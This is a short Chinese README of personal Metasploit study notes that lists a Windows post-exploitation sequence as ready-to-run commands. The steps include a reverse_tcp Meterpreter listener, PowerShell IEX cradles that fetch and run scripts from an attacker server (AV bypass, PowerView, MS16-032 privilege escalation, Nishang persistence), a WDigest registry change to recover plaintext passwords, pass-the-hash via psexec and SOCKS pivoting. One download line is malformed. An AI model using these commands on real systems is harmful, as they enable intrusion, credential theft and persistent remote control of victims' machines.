# Metasploit-Study
心得

1、启动console
msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost 121.43.xx.xx;set lport 5555;exploit -j"
2、过杀软
powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://121.43.xx.xx:8888/https.ps1')
3、域探测
powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://121.43.xx.xx:8888/PowerView.ps1');Invoke-UserHunter"
4、提权
powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.3.101/doc/16-032.ps1');Invoke-MS16-032 -Application C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -Commandline ' -nop -exec bypass .\1.ps1'"
5、下载文件
powershell (new-object System.Net.WebClient).DownloadFile('http:/http://121.43.xx.xx:8888/wce.exe,‘wce.exe')
6、抓明文（windows 2008 R2 后需修改注册表项 use post/windows/manage/wdigest_caching）或者 reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
7、hash传递登录
 use exploit/windows/smb/psexec_psh
8、添加路由
post/multi/manage/autoroute
9、proxychains socks 代理
use auxiliary/server/socks4a
10、持久化nishang
powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://121.43.xx.xx:8888/Add-Persistence.ps1');Add-Persistence -PayloadURL http://121.43.163.43:8888/https5555.ps1"
